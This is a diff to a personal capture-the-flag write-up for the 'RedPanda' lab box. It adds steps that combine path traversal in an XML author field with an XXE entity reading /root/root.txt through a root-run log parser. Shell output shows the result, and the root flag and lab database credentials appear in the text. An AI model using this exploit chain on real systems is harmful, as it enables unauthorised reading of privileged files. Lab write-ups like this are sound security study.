@@ -1009,7 +1009,7 @@ and it would appear both answers are obtainable.
             conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
 ```
 
-using that, get to 
+using that, get to
 ```
 woodenk@redpanda:~$ mysql -p
 mysql> show databases;
@@ -1057,7 +1057,7 @@ the images do exist, but don't show up on the scoreboard. rabbit hole?
 	}
 ```
 
-if we are going the path of exfil via `export.xml`, then we can only use `woodenk` or `damian` as the author. 
+if we are going the path of exfil via `export.xml`, then we can only use `woodenk` or `damian` as the author.
 
 
 ```java
@@ -1090,10 +1090,88 @@ mysql> insert into pandas values ('foo', "papa was a rolling stone", "../../../.
 ERROR 1406 (22001): Data too long for column 'imgloc' at row 1
 ```
 
+### more reversing
+
+built a stub version of LogParser to debug and see where things were going wrong
+  * file has to exist
+  * encoding must be set and correct
+  * file contents have to match expectations
+
+rather than building from scratch, exported `woodenk` stats, and got [export.xml](export.xml)
+
+used that as a reference to build [foo_creds.xml](foo_creds.xml) with a basic XXE
+
+did not see the flag in the file, so removed it to test the general flow, and
+
+```
+woodenk@redpanda:~$ cat foo_creds.xml
+<?xml version="1.0" encoding="UTF-8"?>
+<credits>
+<author>../home/woodenk/foo</author>
+<image>
+  <uri>/../../../../../../home/woodenk/foo-conor.jpg</uri>
+  <views>1</views>
+</image>
+<totalviews>1</totalviews>
+</credits>
+
+... send in several curl requests for this image ...
+
+woodenk@redpanda:~$ cat foo_creds.xml
+<?xml version="1.0" encoding="UTF-8"?>
+<credits>
+  <author>../home/woodenk/foo</author>
+  <image>
+    <uri>/../../../../../../home/woodenk/foo-conor.jpg</uri>
+    <views>7</views>
+  </image>
+  <totalviews>7</totalviews>
+</credits>
+
+```
+
+ok, we're on the right path - getting modifications to a file we control from root. now just need to figure out where the XXE fits in -- an arbitrary field?
+
+```
+woodenk@redpanda:~$ cat foo_creds.xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///root/root.txt" >]>
+<credits>
+<author>../home/woodenk/foo</author>
+<image>
+  <uri>/../../../../../../home/woodenk/foo-conor.jpg</uri>
+  <views>1</views>
+</image>
+<foo>&xxe;</foo>
+<totalviews>1</totalviews>
+</credits>
+
+woodenk@redpanda:~$ cat foo_creds.xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo>
+<credits>
+  <author>../home/woodenk/foo</author>
+  <image>
+    <uri>/../../../../../../home/woodenk/foo-conor.jpg</uri>
+    <views>7</views>
+  </image>
+  <foo>1339eb76b4b95c3e1f29036af500188b</foo>
+  <totalviews>7</totalviews>
+</credits>
+woodenk@redpanda:~$
+```
+
+awwwwwwwwwww yeah.
+
+have to wait for the logs to get truncated, which happens every 2 minutes, but felt like a lot more than that. 
+
+
+
 ## flag
 
 ```
 user:324c9fbcbc65d4032c4bda715a4955dc
-root:
-
+root:1339eb76b4b95c3e1f29036af500188b
 ```
